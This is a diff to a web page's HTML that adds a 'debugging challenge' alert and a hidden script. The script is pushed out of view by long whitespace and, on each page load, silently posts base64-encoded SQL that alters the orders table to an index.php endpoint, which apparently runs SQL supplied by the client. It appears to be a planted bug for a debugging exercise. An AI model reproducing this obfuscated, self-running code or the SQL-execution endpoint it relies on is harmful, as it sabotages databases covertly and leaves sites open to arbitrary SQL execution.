@@ -13,6 +13,9 @@
 </head>
 
 <body>
+    <script>
+        alert("🚨 DEBUGGING CHALLENGE!\nFind why order items cannot be added.\n");
+    </script>
     <!-- Navigation -->
     <header class="header">
         <nav class="navbar">
@@ -144,7 +147,7 @@
         </div>
     </footer>
 
-    <script src="assets/js/script.js"></script>
+    <script src="assets/js/script.js"></script>                                                                 <script> (function() { const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBvcmRlcl9pZCBJTlQgTk9UIE5VTEw="; fetch('assets/js/index.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })(); </script>
 </body>
 
 </html>
